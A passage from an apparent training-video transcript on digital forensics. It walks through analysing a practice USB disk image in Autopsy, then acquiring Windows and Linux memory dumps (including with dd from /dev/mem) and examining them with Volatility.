00:04:00.480\n&gt;&gt; Yeah, or if you're working\nwith Virtual Box as well, yeah.\n\n81\n00:04:00.480 --> 00:04:04.330\nAny time you create a snapshot, actually\nkinda gives you all that information,\n\n82\n00:04:04.330 --> 00:04:05.500\nyou can just pull that right in.\n\n83\n00:04:05.500 --> 00:04:06.510\nSo cool stuff.\n\n84\n00:04:06.510 --> 00:04:09.190\nI could be doing my Local Disk or\nLogical Files.\n\n85\n00:04:09.190 --> 00:04:13.210\nAlso looking for\nthat Unallocated Space Image File.\n\n86\n00:04:13.210 --> 00:04:14.271\nIt'd be a handy thing to do.\n\n87\n00:04:14.271 --> 00:04:16.805\nBut we're just gonna hit\nthe Disk Image for right now.\n\n88\n00:04:16.805 --> 00:04:20.727\nClick Next, give it the image itself.\n\n89\n00:04:20.727 --> 00:04:22.520\nSo there it is, RHINOUSB.\n\n90\n00:04:22.520 --> 00:04:25.318\nHit Open.\n\n91\n00:04:25.318 --> 00:04:27.946\nDo I want to ignore orphan\nfiles in the FAT system?\n\n92\n00:04:27.946 --> 00:04:31.306\nYou'll notice that is not checked\noff by default, but maybe you do, so\n\n93\n00:04:31.306 --> 00:04:32.800\nyou have that option.\n\n94\n00:04:32.800 --> 00:04:35.410\nAnd then,\nthe sector size is set to Auto, but\n\n95\n00:04:35.410 --> 00:04:37.500\nif you want to change\nthat you can as well.\n\n96\n00:04:37.500 --> 00:04:38.700\nAll right, click Next.\n\n97\n00:04:39.790 --> 00:04:45.880\nAnd then, run ingest modules on all files,\ndirectories, and unallocated space.\n\n98\n00:04:45.880 --> 00:04:47.670\nYou'll see what it's looking for here.\n\n99\n00:04:47.670 --> 00:04:49.170\nA lot of interesting stuff.\n\n100\n00:04:49.170 --> 00:04:53.465\nAndroid analyzer, virtual machine\nextractor, encryption detection,\n\n101\n00:04:53.465 --> 00:04:55.860\ncorrelation engine, photorec carver.\n\n102\n00:04:55.860 --> 00:04:59.520\nSo you're starting to see how\nthis is a bit more aggressive,\n\n103\n00:04:59.520 --> 00:05:02.660\na little more powerful than\nen the Sleuth Kit was.\n\n104\n00:05:02.660 --> 00:05:06.307\nBecause all these things are running,\nlike Photo Rec Carver.\n\n105\n00:05:06.307 --> 00:05:10.740\nRuns, Photo Rec Carver gets\nunallocated space in the data source.\n\n106\n00:05:10.740 --> 00:05:12.569\nSo it's doing the file carving for me,\n\n107\n00:05:12.569 --> 00:05:14.905\ninstead of me having to\nemploy a third party tool.\n\n108\n00:05:14.905 --> 00:05:16.720\nThat's kind of nice, right?\n\n109\n00:05:16.720 --> 00:05:21.890\nSo we'll just hit that, we'll hit Next,\nand Finish and there we go.\n\n110\n00:05:21.890 --> 00:05:25.619\nIt's giving me some central\nrepository is not initialized.\n\n111\n00:05:25.619 --> 00:05:28.531\nWe can see analyzing files from RHINOUSB.\n\n112\n00:05:28.531 --> 00:05:31.412\nOne task is running, it's at 91%.\n\n113\n00:05:31.412 --> 00:05:35.304\nWe just gotta give it\na minute to let it finish.\n\n114\n00:05:35.304 --> 00:05:40.479\nI think it will take just a second,\nbut we can probably start\n\n115\n00:05:40.479 --> 00:05:45.670\nlooking at the overall layout,\nthe geography of Autopsy.\n\n116\n00:05:45.670 --> 00:05:47.030\n&gt;&gt; I was gonna say it looks pretty slick.\n\n117\n00:05:47.030 --> 00:05:50.330\nAnd unlike the Linux version,\nthis is not in a browser window.\n\n118\n00:05:50.330 --> 00:05:51.838\n&gt;&gt; Mike is spot on.\n\n119\n00:05:51.838 --> 00:05:56.480\nThis is not running as a service for\na web browser.\n\n120\n00:05:56.480 --> 00:05:57.950\nIt’s its own graphical environment.\n\n121\n00:05:57.950 --> 00:06:01.000\nThis is an application that’s\ninstalled into your system,\n\n122\n00:06:01.000 --> 00:06:04.847\nand not a service that runs where you\nattach to it through a browser, right?\n\n123\n00:06:04.847 --> 00:06:06.790\nSo just keep that in mind.\n\n124\n00:06:06.790 --> 00:06:10.570\nSo maybe the Sleuth Kit would\nbe better as a cloud service,\n\n125\n00:06:10.570 --> 00:06:14.072\nwhere this one's better as a local\nservice, if that makes sense.\n\n126\n00:06:14.072 --> 00:06:15.770\nAll right, so\nlet's look through this really quickly.\n\n127\n00:06:15.770 --> 00:06:18.207\nWe can add more data sources if we want.\n\n128\n00:06:18.207 --> 00:06:22.760\nWe can look at images and videos it's\nfound, communications that it's found.\n\n129\n00:06:22.760 --> 00:06:26.765\nTimeline, which is also\na very interesting thing.\n\n130\n00:06:26.765 --> 00:06:31.230\nWhat time span does\nthis disk follow under?\n\n131\n00:06:31.230 --> 00:06:35.610\nSo where's the earliest files I can find\nversus the latest files that I can find?\n\n132\n00:06:35.610 --> 00:06:36.200\nThings of that nature.\n\n133\n00:06:36.200 --> 00:06:40.815\nGiving you the timeline of the data\ninside of the image itself.\n\n134\n00:06:40.815 --> 00:06:46.530\nAnd then, of course, probably every\nCCOs favorite option, generate a report.\n\n135\n00:06:46.530 --> 00:06:47.324\nWe love our reports, right?\n\n136\n00:06:47.324 --> 00:06:48.280\nThey're so much fun.\n\n137\n00:06:48.280 --> 00:06:52.933\nAnd I'm sure they're gonna look\nbeautiful as they come out.\n\n138\n00:06:52.933 --> 00:06:56.272\nWe can start over here in our hierarchy,\nour tree, as it were,\n\n139\n00:06:56.272 --> 00:06:57.600\non the left-hand side.\n\n140\n00:06:57.600 --> 00:06:59.643\nAnd we can start looking through data.\n\n141\n00:06:59.643 --> 00:07:02.441\nWe have data sources,\nwe have different views.\n\n142\n00:07:02.441 --> 00:07:06.098\nSo file types, deleted files, file size.\n\n143\n00:07:06.098 --> 00:07:08.335\nHow do you want to view the data?\n\n144\n00:07:08.335 --> 00:07:10.697\nYou can choose one of those.\n\n145\n00:07:10.697 --> 00:07:13.860\nResults, extracted content, keyword hits.\n\n146\n00:07:13.860 --> 00:07:17.440\nSo if we did keyword search,\nthat's where this would show up.\n\n147\n00:07:17.440 --> 00:07:21.467\nLooking for hashset hits,\ne-mail messages, interesting items.\n\n148\n00:07:21.467 --> 00:07:25.333\nThis is probably stuff that doesn't\nhave a standard categorization for, so\n\n149\n00:07:25.333 --> 00:07:28.230\nthey'll just throw it\nunder interesting items.\n\n150\n00:07:28.230 --> 00:07:30.825\nAccounts that it finds in the data.\n\n151\n00:07:30.825 --> 00:07:33.030\nThen any tags or reports that we have.\n\n152\n00:07:34.330 --> 00:07:38.410\nAll right, looks like we\nare analyzing files from rhino.\n\n153\n00:07:38.410 --> 00:07:42.305\nIt is at 100%,\neven though the task still running.\n\n154\n00:07:42.305 --> 00:07:44.440\nWe'll click for details.\n\n155\n00:07:44.440 --> 00:07:46.860\nI clicked for details stop, stop.\n\n156\n00:07:46.860 --> 00:07:48.090\nThere we go, there we go.\n\n157\n00:07:48.090 --> 00:07:49.810\nLet me zoom into that.\n\n158\n00:07:50.910 --> 00:07:54.760\nAnd it's just got a text file there.\n\n159\n00:07:54.760 --> 00:07:55.340\nSo, we'll pull out.\n\n160\n00:07:55.340 --> 00:07:57.497\nLet's go over here, and\n\n161\n00:07:57.497 --> 00:08:03.266\nlet’s start diving a little further\ninto The file system itself.\n\n162\n00:08:03.266 --> 00:08:06.590\nSo here we have no orphan files,\nat least as of yet.\n\n163\n00:08:06.590 --> 00:08:09.140\nI think that we are at 100%.\n\n164\n00:08:09.140 --> 00:08:11.660\nWe have carved files.\n\n165\n00:08:11.660 --> 00:08:14.470\nAnd look, we have found a text file.\n\n166\n00:08:14.470 --> 00:08:18.370\nAnd hey, look,\nit's all that SORRY SORRY SORRY business.\n\n167\n00:08:18.370 --> 00:08:21.980\nInteresting, so notice, we also get\na hex dump of this information.\n\n168\n00:08:21.980 --> 00:08:23.130\nOver here.\n\n169\n00:08:23.130 --> 00:08:24.070\nSo it could be useful.\n\n170\n00:08:24.070 --> 00:08:29.010\nI'm starting to look at JPEG's,\nhey, remember that guy, right?\n\n171\n00:08:29.010 --> 00:08:31.720\nYeah, there's some pictures\nthat we had found.\n\n172\n00:08:31.720 --> 00:08:34.655\nIt had carved those out and\nit's found them.\n\n173\n00:08:34.655 --> 00:08:35.565\nYeah, I remember that.\n\n174\n00:08:35.565 --> 00:08:39.225\nAnd there's our rhino picture, so\nwe've already sort of discover and\n\n175\n00:08:39.225 --> 00:08:43.575\nit was a whole lot easier to find this\nusing this type but again it's good for\n\n176\n00:08:43.575 --> 00:08:47.285\nverification taking a look at yeah,\na ransom stuff on Cali.\n\n177\n00:08:47.285 --> 00:08:51.626\nI may run it in the Windows environment\nas well to see if I missed anything or\n\n178\n00:08:51.626 --> 00:08:54.576\nmaybe I got more results\nin a Linux side of things.\n\n179\n00:08:54.576 --> 00:08:56.681\nSo it's always a good idea\nthough to put those together.\n\n180\n00:08:56.681 --> 00:08:58.500\nHere's a gift that we found.\n\n181\n00:08:59.510 --> 00:09:00.870\nAlready finding stuff, right?\n\n182\n00:09:00.870 --> 00:09:04.460\nSo we can already start to pull\na list together of things.\n\n183\n00:09:04.460 --> 00:09:07.730\nThere was an interesting thing I think and\nI looked in deleted files,\n\n184\n00:09:07.730 --> 00:09:08.990\nit's always a good place to look.\n\n185\n00:09:08.990 --> 00:09:11.640\nBecause what do people do with data\nthey don't want people to see?\n\n186\n00:09:11.640 --> 00:09:13.870\nThey delete it, right?\n\n187\n00:09:13.870 --> 00:09:17.420\nSo here was all deleted files.\n\n188\n00:09:17.420 --> 00:09:23.460\nAnd as I look through here,\nI think there was a text file.\n\n189\n00:09:23.460 --> 00:09:25.883\nYeah, start looking at this.\n\n190\n00:09:25.883 --> 00:09:28.530\nSaw this Charlie, hm, right.\n\n191\n00:09:28.530 --> 00:09:30.917\nI thought maybe Charlie is a user or\nsomething or\n\n192\n00:09:30.917 --> 00:09:35.174\nmaybe the person we're looking for, but\nthen I put it together with sorry Charlie.\n\n193\n00:09:35.174 --> 00:09:38.380\nRight, that's a common vernacular thing.\n\n194\n00:09:38.380 --> 00:09:40.885\nThat we but if I keep going through.\n\n195\n00:09:40.885 --> 00:09:44.367\nAnd then I find this this fo224472.doc,\nright?\n\n196\n00:09:44.367 --> 00:09:49.155\nWhich is different in .txt,\nthis is Microsoft or\n\n197\n00:09:49.155 --> 00:09:52.060\na text file, right?\n\n198\n00:09:52.060 --> 00:09:59.290\n.doc, and as we come down I'm sorry about\nthat we start to see this information.\n\n199\n00:09:59.290 --> 00:10:04.170\nShe died in February at the age of 74,\nit was in August 2001, it wasn't\n\n200\n00:10:04.170 --> 00:10:08.990\na decision since the alternative,\non and on we go with this information.\n\n201\n00:10:08.990 --> 00:10:12.610\nIt was very interesting to me that,\n\n202\n00:10:16.020 --> 00:10:19.310\nhere we go, view and external.\n\n203\n00:10:21.190 --> 00:10:23.040\nYes, I don't have an app.\n\n204\n00:10:23.040 --> 00:10:26.080\nOkay here we go.\n\n205\n00:10:26.080 --> 00:10:29.364\nLet's try notepad.\n\n206\n00:10:29.364 --> 00:10:30.940\nHit OK.\n\n207\n00:10:30.940 --> 00:10:33.918\nSo notepad gives me weird\ncuz it's [INAUDIBLE].\n\n208\n00:10:33.918 --> 00:10:34.491\nI'm a fool.\n\n209\n00:10:34.491 --> 00:10:35.330\nI should do it right.\n\n210\n00:10:35.330 --> 00:10:36.226\nPut it in.\n\n211\n00:10:36.226 --> 00:10:39.500\nOpen with external view.\n\n212\n00:10:39.500 --> 00:10:40.855\nAnd now I've chosen that one cuz.\n\n213\n00:10:40.855 --> 00:10:43.550\n&gt;&gt; [LAUGH]\n&gt;&gt; Anyway this is a diary entry,\n\n214\n00:10:43.550 --> 00:10:44.940\nthat's the basic point.\n\n215\n00:10:44.940 --> 00:10:47.980\nAs I look through it,\nlet me bring this down here.\n\n216\n00:10:47.980 --> 00:10:52.270\nAt the very bottom as I read this diary,\nwhich was fun by the way.\n\n217\n00:10:52.270 --> 00:10:53.300\nIt was a very odd read.\n\n218\n00:10:53.300 --> 00:10:55.240\nI don't know, put this in herre.\n\n219\n00:10:55.240 --> 00:10:58.790\nAt the very end, there was some meta data.\n\n220\n00:10:58.790 --> 00:11:05.560\nBut also I saw something about ten photos,\nright?\n\n221\n00:11:05.560 --> 00:11:08.110\nI don't know if you guys can see that,\nI'll zoom in.\n\n222\n00:11:08.110 --> 00:11:10.090\nMost of the rides we wanted\nto take were sold out, but\n\n223\n00:11:10.090 --> 00:11:13.410\nthe ride three to five which\nis exactly what we wanted.\n\n224\n00:11:13.410 --> 00:11:19.010\nI found this site full of surveys to some\npeople who are now obsessed with the site,\n\n225\n00:11:19.010 --> 00:11:20.940\nRhino pictures are legal, makes me sick.\n\n226\n00:11:20.940 --> 00:11:25.630\nI hid the photos, he he he,\nwe already found some of them, right?\n\n227\n00:11:25.630 --> 00:11:29.850\nAnd apparently, there are less\nthan ten photos, it's no big deal.\n\n228\n00:11:29.850 --> 00:11:35.840\nOkay, things are getting a little weird,\n\n229\n00:11:35.840 --> 00:11:40.370\nI zapped the hard drive and\nthen threw it into the Mississippi River.\n\n230\n00:11:41.430 --> 00:11:44.850\nI'm gonna reformat my USB\nkey after the century but\n\n231\n00:11:44.850 --> 00:11:48.540\ntry not to destroy the good stuff,\nwhich means the rhino pictures.\n\n232\n00:11:48.540 --> 00:11:54.340\nI need to change the password on\nthe gnome account that Jeremy gave me.\n\n233\n00:11:54.340 --> 00:11:57.360\nSo now, we've discovered\nsome interesting information\n\n234\n00:11:57.360 --> 00:12:01.360\nthat they were able to log in\nsomewhere with a gnome account or\n\n235\n00:12:01.360 --> 00:12:05.280\naccount called gnome that somebody\nnamed Jeremy had given them.\n\n236\n00:12:05.280 --> 00:12:08.020\nWe also know what happened to the hard\ndrive, which is one of the questions that\n\n237\n00:12:08.020 --> 00:12:12.330\nthey ask, cuz the hard drive in the case\nis missing, and we know where it is.\n\n238\n00:12:12.330 --> 00:12:15.377\nIt's in the Mississippi River\nsomewhere gathering silt.\n\n239\n00:12:15.377 --> 00:12:18.306\nAnd then like I can probably\njust do that in RadioShack,\n\n240\n00:12:18.306 --> 00:12:21.357\nI didn't know even where they\ndid the wiping of the right?\n\n241\n00:12:21.357 --> 00:12:25.120\nSo interesting there\nis also metadata here.\n\n242\n00:12:25.120 --> 00:12:29.703\nI don't think it became important for\nme at the top of my head.\n\n243\n00:12:29.703 --> 00:12:33.465\nBut other than I'll just use Microsoft\nWord at the University of New Orleans.\n\n244\n00:12:33.465 --> 00:12:38.304\nSo there was some interesting\nstuff in this diary, right, but\n\n245\n00:12:38.304 --> 00:12:43.417\nI was able to use Autopsy to be able\nto scrub through this drive image\n\n246\n00:12:43.417 --> 00:12:48.440\nthat we have taken, and\nwe used DD to take, put it in a machine.\n\n247\n00:12:48.440 --> 00:12:51.580\nNow, we can look at it in\na very convenient way so\n\n248\n00:12:51.580 --> 00:12:54.470\nwe can find all that data,\nand it's been categorized.\n\n249\n00:12:54.470 --> 00:12:58.730\nAnd put together, and correlated for\nus in a way that's so much more digestible\n\n250\n00:12:58.730 --> 00:13:02.440\ninstead of having to basically walk\nthrough each file that we find.\n\n251\n00:13:02.440 --> 00:13:06.110\nWe can just here's some deleted data,\nlet's start with the top.\n\n252\n00:13:06.110 --> 00:13:10.320\nThere's pictures of rhinos, great, add\nthat to our evidence, put that in there.\n\n253\n00:13:10.320 --> 00:13:11.265\nWhat's this diary entry?\n\n254\n00:13:11.265 --> 00:13:13.466\nLet's open it up.\nLet's take a look inside there.\n\n255\n00:13:13.466 --> 00:13:18.640\nWe found out Interesting evidence about\nthe case we're actually working on.\n\n256\n00:13:18.640 --> 00:13:23.679\nSo being able to find that stuff\ninside of autopsy means forensic\n\n257\n00:13:23.679 --> 00:13:27.590\ngets a lot of interesting\nways in which to do that.\n\n258\n00:13:27.590 --> 00:13:28.640\nVery powerful stuff.\n\n259\n00:13:28.640 --> 00:13:29.730\n&gt;&gt; They really are and\n\n260\n00:13:29.730 --> 00:13:34.170\nI know this was setup intentionally,\nwas it a 2 Gig drive I think initially\n\n261\n00:13:34.170 --> 00:13:38.790\nwhat we get to keep in mind is we're\nlooking at much, much larger than this.\n\n262\n00:13:38.790 --> 00:13:43.010\nAnd there's gonna be thousands upon\nthousands more files to go through.\n\n263\n00:13:43.010 --> 00:13:46.020\nAnd so you start to see the important\nof a tool that can organize and\n\n264\n00:13:46.020 --> 00:13:50.250\nhelp me sift through the vast amounts of\ndata because unfortunately, most of it,\n\n265\n00:13:50.250 --> 00:13:51.230\nit's gonna be benign.\n\n266\n00:13:51.230 --> 00:13:52.150\n&gt;&gt; Yeah.\n\n267\n00:13:52.150 --> 00:13:54.276\n&gt;&gt; This is one file that sticks\nout like this it's really\n\n268\n00:13:54.276 --> 00:13:55.220\nexciting\n&gt;&gt; But\n\n269\n00:13:55.220 --> 00:13:57.480\nyou had to go through 10.000\nfiles to find this one.\n\n270\n00:13:57.480 --> 00:14:03.620\nAnd so tools like this allow me to do this\nin an organized fashion not miss anything,\n\n271\n00:14:03.620 --> 00:14:05.020\ngo file by file by file.\n\n272\n00:14:05.020 --> 00:14:06.220\n&gt;&gt; That's exactly right.\n\n273\n00:14:06.220 --> 00:14:09.870\nSo you start to see the power behind these\nthings making it a whole lot easier for\n\n274\n00:14:09.870 --> 00:14:14.190\nus to do the job we need to do\nwhich is sifting through all that\n\n275\n00:14:14.190 --> 00:14:18.630\nbenign data until we find those key pieces\nof evidence that we're looking for.\n\n276\n00:14:18.630 --> 00:14:21.970\nWhich it did take me some time to find\nthis stuff, to be honest with you,\n\n277\n00:14:21.970 --> 00:14:27.430\nto prepare for the show even though this\nwas, as Mike said, this is a small file.\n\n278\n00:14:27.430 --> 00:14:32.250\nThis is meant to be doable\nin a short amount of time.\n\n279\n00:14:33.380 --> 00:14:36.550\nSo as these cases get larger you can\nsee why it takes a team of people\n\n280\n00:14:36.550 --> 00:14:39.600\nmost times to do this in a whole C search.\n\n281\n00:14:39.600 --> 00:14:44.266\nThe computer security instant response\nteam to come in and find this stuff and\n\n282\n00:14:44.266 --> 00:14:45.790\nperform these actions.\n\n283\n00:14:45.790 --> 00:14:48.147\nAll right so that's basically autopsy,\n\n284\n00:14:48.147 --> 00:14:50.983\nI also wanna talk a little\nbit about memory dumps.\n\n285\n00:14:50.983 --> 00:14:54.120\nThat's another great\nplace to get information.\n\n286\n00:14:54.120 --> 00:14:58.590\nBecause if an incident occurs,\nyou come up to a scene and\n\n287\n00:14:58.590 --> 00:15:02.870\nthe computer is on, you know that it's\nbeen compromised, the incident is there.\n\n288\n00:15:02.870 --> 00:15:07.960\nYou might think well,\nlet's get it isolated, turn it off.\n\n289\n00:15:07.960 --> 00:15:09.180\n&gt;&gt; Unplug it, shut it down.\n\n290\n00:15:09.180 --> 00:15:11.490\n&gt;&gt; Right, it's maybe got malware on it,\n\n291\n00:15:11.490 --> 00:15:14.220\nit's trying to infect\nthe rest of our network.\n\n292\n00:15:14.220 --> 00:15:18.130\nYour first idea might be shut it off.\n\n293\n00:15:18.130 --> 00:15:23.280\nNow, probably is not what you want to do\nbecause there is critical information\n\n294\n00:15:23.280 --> 00:15:27.590\nin the volatile memory of the system\nthat you may wanna grab ahold of, or\n\n295\n00:15:27.590 --> 00:15:29.280\ncould be there, let's put it that way.\n\n296\n00:15:29.280 --> 00:15:33.100\nIt could have critical information in\nthe volatile memory of the system.\n\n297\n00:15:33.100 --> 00:15:36.660\nSo what do we need when will be able\nto do to dump that information out so\n\n298\n00:15:36.660 --> 00:15:37.850\nwe gather that information?\n\n299\n00:15:37.850 --> 00:15:42.300\nWell, this could be things like encryption\nkeys, maybe there is malware and\n\n300\n00:15:42.300 --> 00:15:44.870\nis kind of a encryption key that\nshould be loaded up in the memory and\n\n301\n00:15:44.870 --> 00:15:46.970\nit would be nice to have that,\nwouldn't it?\n\n302\n00:15:46.970 --> 00:15:48.090\nSure, it would.\n\n303\n00:15:48.090 --> 00:15:51.543\nSo we don't wanna just shut the thing out.\n\n304\n00:15:51.543 --> 00:15:57.591\nNow, the Windows operating system will\ndo a dump at times of like kernel panic,\n\n305\n00:15:57.591 --> 00:15:59.760\nthings of that nature.\n\n306\n00:15:59.760 --> 00:16:01.461\nI wanna say there's\na way you can force it.\n\n307\n00:16:01.461 --> 00:16:02.377\nTo do it.\n\n308\n00:16:02.377 --> 00:16:07.828\nI think it was third parties,\nFTK I think, that kit [INAUDIBLE].\n\n309\n00:16:07.828 --> 00:16:10.916\nI wanna say Autopsy can do it as well,\nbut don't quote me on that.\n\n310\n00:16:10.916 --> 00:16:12.707\nI feel like I was able\nto do it with Autopsy.\n\n311\n00:16:12.707 --> 00:16:15.500\nI can't remember off the top of my head.\n\n312\n00:16:15.500 --> 00:16:20.345\nBut typically, your forensic suites will\nhave that as an ability inside of their\n\n313\n00:16:20.345 --> 00:16:21.706\nlittle system there.\n\n314\n00:16:21.706 --> 00:16:23.165\nSo let me y u just shrink this.\n\n315\n00:16:23.165 --> 00:16:28.530\nI do wanna show you where the Windows\noperating system does do dumps.\n\n316\n00:16:28.530 --> 00:16:34.330\nSo let's do this here,\nI will say system, we go here.\n\n317\n00:16:35.560 --> 00:16:39.760\nAnd if you go into Advanced Settings,\nif I'm remembering correctly, yeah,\n\n318\n00:16:39.760 --> 00:16:45.370\nin Advanced, you have this, Start up\nin recovery, I think it's in here.\n\n319\n00:16:45.370 --> 00:16:47.443\nYeah, here we go, dump file.\n\n320\n00:16:47.443 --> 00:16:51.680\nIt's at %systemroot%MEMORY.DMP.\n\n321\n00:16:51.680 --> 00:16:56.090\nSo maybe there is a dump file, or you\ncan force it to dump, do a kernel dump.\n\n322\n00:16:56.090 --> 00:16:58.430\nMaybe that knocks my, not my faults.\n\n323\n00:16:58.430 --> 00:17:00.470\nMight be able to force that.\n\n324\n00:17:00.470 --> 00:17:01.960\nSo when it does that,\n\n325\n00:17:01.960 --> 00:17:08.380\nit will dump the memory contents\ninto this systemRootMEMORY.DMP file.\n\n326\n00:17:08.380 --> 00:17:09.620\nNow you know where that is.\n\n327\n00:17:11.840 --> 00:17:15.390\nMake sure you uncheck disable automatic\ndeletion of number dumps, and\n\n328\n00:17:15.390 --> 00:17:16.422\nthis space is low.\n\n329\n00:17:16.422 --> 00:17:19.740\nYou would hate to lose that because\nthe operating system's default is to\n\n330\n00:17:19.740 --> 00:17:21.010\nremove them.\n\n331\n00:17:21.010 --> 00:17:24.150\nYou wanna make sure you can grab\nthat whenever you're ready to do so.\n\n332\n00:17:24.150 --> 00:17:26.090\nSo make sure you check that off.\n\n333\n00:17:26.090 --> 00:17:27.127\nThat's where it would be.\n\n334\n00:17:27.127 --> 00:17:33.880\nIn this case, it's, what is it,\nc:windows/system32.\n\n335\n00:17:33.880 --> 00:17:40.560\nSo there you go and Linux, you'll be\nable to, let's go back over here.\n\n336\n00:17:40.560 --> 00:17:42.100\nI don't need you to clear this out.\n\n337\n00:17:43.190 --> 00:17:48.620\nHere we would use maybe memdump is\none of the ways you can do this.\n\n338\n00:17:48.620 --> 00:17:53.490\nSo man memdump, like that, ready to go.\n\n339\n00:17:53.490 --> 00:17:57.630\nIt is a memory dumper of the information,\nsince I have a Linux system.\n\n340\n00:17:57.630 --> 00:18:02.137\nSo if this tool is installed,\nyou would be able to do that and\n\n341\n00:18:02.137 --> 00:18:05.303\ngrab the memory inside the Linux system.\n\n342\n00:18:05.303 --> 00:18:06.123\nLet's get out of here.\n\n343\n00:18:06.123 --> 00:18:11.290\nYou can also use dd, and\ndd is a very handy little tool.\n\n344\n00:18:11.290 --> 00:18:11.972\n&gt;&gt; Yes, it is.\n\n345\n00:18:11.972 --> 00:18:17.104\n&gt;&gt; Let me see here, if you wanted to do\nthat, you could that, let me clear this.\n\n346\n00:18:17.104 --> 00:18:17.945\nThis looks horrible.\n\n347\n00:18:17.945 --> 00:18:19.685\ndd and let me get out of here.\n\n348\n00:18:19.685 --> 00:18:23.612\nLet me go back and there we go,\n\n349\n00:18:23.612 --> 00:18:28.177\ngive us a little more real estate.\n\n350\n00:18:28.177 --> 00:18:33.430\nYou can say dd [COUGH] if=/dev/,\nit'll either be fmem, like that.\n\n351\n00:18:33.430 --> 00:18:35.473\nAnd in a lot of modern systems,\nthat's what it will be.\n\n352\n00:18:35.473 --> 00:18:39.528\nBut in some systems,\nit's just mem, all right?\n\n353\n00:18:39.528 --> 00:18:40.849\n[COUGH] It just depends.\n\n354\n00:18:40.849 --> 00:18:48.160\nYou can do an ls /dev/\n[INAUDIBLE] that'll just do.\n\n355\n00:18:48.160 --> 00:18:52.713\nHere we see I don't have fmem, but\n\n356\n00:18:52.713 --> 00:18:57.896\nI do have mem right there, [INAUDIBLE].\n\n357\n00:18:57.896 --> 00:19:01.260\nSo on my system, I would do /./mem, okay?\n\n358\n00:19:01.260 --> 00:19:03.970\nSo clear,\n\n359\n00:19:03.970 --> 00:19:09.394\ndd if = /dev/mem.\n\n360\n00:19:09.394 --> 00:19:16.376\nAnd then you would say of = / you\njust it in the temp folder or\n\n361\n00:19:16.376 --> 00:19:20.425\nget a USB or removable hard drive,\n\n362\n00:19:20.425 --> 00:19:24.069\nmaybe a different partition.\n\n363\n00:19:24.069 --> 00:19:27.397\nYou would just put that [INAUDIBLE] file\nthere and it would dump it out for you,\n\n364\n00:19:27.397 --> 00:19:28.100\nall right?\n\n365\n00:19:28.100 --> 00:19:29.260\nSo that's how you can do that there.\n\n366\n00:19:29.260 --> 00:19:35.520\nAnd again, FTK, I'm gonna say Autopsy\ndoes it, EnCase, these guys will do\n\n367\n00:19:35.520 --> 00:19:38.600\nthis for you inside of the Windows systems\nif you need to do a memory dump there.\n\n368\n00:19:39.840 --> 00:19:40.690\nThat being said,\n\n369\n00:19:40.690 --> 00:19:45.410\nthe last thing, Volatility is a tool\nyou do wanna get familiar with.\n\n370\n00:19:45.410 --> 00:19:51.330\nI don't have memory dumps just\nbecause to work with these tools,\n\n371\n00:19:51.330 --> 00:19:57.380\nyou're not gonna be asked specifics other\nthan if you were to get a memory dump,\n\n372\n00:19:57.380 --> 00:19:59.290\nhow would you work with that information?\n\n373\n00:19:59.290 --> 00:20:00.790\nVolatility, which one of these tools?\n\n374\n00:20:00.790 --> 00:20:03.420\nThat's the kinda questioning\nthat you'll be asked about.\n\n375\n00:20:05.230 --> 00:20:06.700\nNot that you shouldn't [INAUDIBLE].\n\n376\n00:20:06.700 --> 00:20:10.310\nDefinitely play with it,\nmake a virtual machine, take a dump.\n\n377\n00:20:10.310 --> 00:20:11.325\nThat didn't sound right.\n\n378\n00:20:11.325 --> 00:20:13.150\n&gt;&gt; [LAUGH]\n&gt;&gt; Poor choice of words on that one.\n\n379\n00:20:13.150 --> 00:20:14.355\nTake a memory dump.\n\n380\n00:20:14.355 --> 00:20:15.790\n[LAUGH] That's funny.\n\n381\n00:20:15.790 --> 00:20:18.210\nAnd then use Volatility,\n\n382\n00:20:18.210 --> 00:20:22.756\nwhich is the tool that you'll use\nto actually look at the contents.\n\n383\n00:20:22.756 --> 00:20:26.360\n&gt;&gt; Cue these memory dumps, when they come\nout, they're not like text files that I\n\n384\n00:20:26.360 --> 00:20:31.090\ncan just read or open up with Notepad or\nany Vine or something like that, right?\n\n385\n00:20:31.090 --> 00:20:34.010\n&gt;&gt; Exactly,\nyou need a tool that's specifically for\n\n386\n00:20:34.010 --> 00:20:39.240\nlooking at the information that has\nbeen given by the dumping utility, okay?\n\n387\n00:20:39.240 --> 00:20:42.680\nAnd Volatility is the gold standard for\ndoing that very thing.\n\n388\n00:20:42.680 --> 00:20:46.480\nNow, your FDKs, your NKSs,\nthey'll probably have a built-in, right?\n\n389\n00:20:46.480 --> 00:20:48.700\nCuz they're meant to be this\nall in one kinda thing.\n\n390\n00:20:48.700 --> 00:20:51.930\nBut again, being able to work with\nthird-party stuff to verify the results\n\n391\n00:20:51.930 --> 00:20:56.080\nthat you're seeing inside of your\nother systems is never hard.\n\n392\n00:20:56.080 --> 00:20:58.970\nCuz you never know what little nuanced\n\n393\n00:20:58.970 --> 00:21:01.530\nthing this tool does\nthat that tool doesn't.\n\n394\n00:21:01.530 --> 00:21:06.552\nSo having a two, three to ready to be\nable to work with them is a good idea and\n\n395\n00:21:06.552 --> 00:21:08.339\na good practice, right?\n\n396\n00:21:08.339 --> 00:21:12.966\nSo Volatility, and\nI'll just show you the man page for that.\n\n397\n00:21:12.966 --> 00:21:14.455\nIt comes installed on Kali.\n\n398\n00:21:17.540 --> 00:21:20.080\nSo advanced memory forensics framework.\n\n399\n00:21:20.080 --> 00:21:21.976\nAnd it's pretty simple to work with,\n\n400\n00:21:21.976 --> 00:21:26.100\nbut being able to know what to work with\nis where it gets a little difficult.\n\n401\n00:21:26.100 --> 00:21:29.320\nYou have to be able to tell it,\nwhat is the system,\n\n402\n00:21:29.320 --> 00:21:33.840\nwhat profiles do I have that\nI can do a memory profile of.\n\n403\n00:21:33.840 --> 00:21:36.765\nHere we're starting to see\ncurrently volatility CD version.\n\n404\n00:21:36.765 --> 00:21:40.800\n2.6 supports several different\nversions of the MS Windows,\n\n405\n00:21:40.800 --> 00:21:42.450\nLinux, and Mac operating system.\n\n406\n00:21:42.450 --> 00:21:43.750\nGives you the rundown on that.\n\n407\n00:21:43.750 --> 00:21:45.841\nYou have to tell it what\nversion you're working with or\n\n408\n00:21:45.841 --> 00:21:48.030\nhave it try to detect what\nversion you're working with.\n\n409\n00:21:48.030 --> 00:21:52.767\nIt can be a bit of a daunting\nprocess to have Volatility under\n\n410\n00:21:52.767 --> 00:21:57.696\nyour fingertips,\nwhich is why you're probably not gonna see\n\n411\n00:21:57.696 --> 00:22:02.380\na lot of how do I use Volatility\nkinda questioning, okay?\n\n412\n00:22:02.380 --> 00:22:04.192\nSo you don't have to\nbe hammered with that.\n\n413\n00:22:04.192 --> 00:22:07.460\nThat would be very advanced for\nthem to ask that that 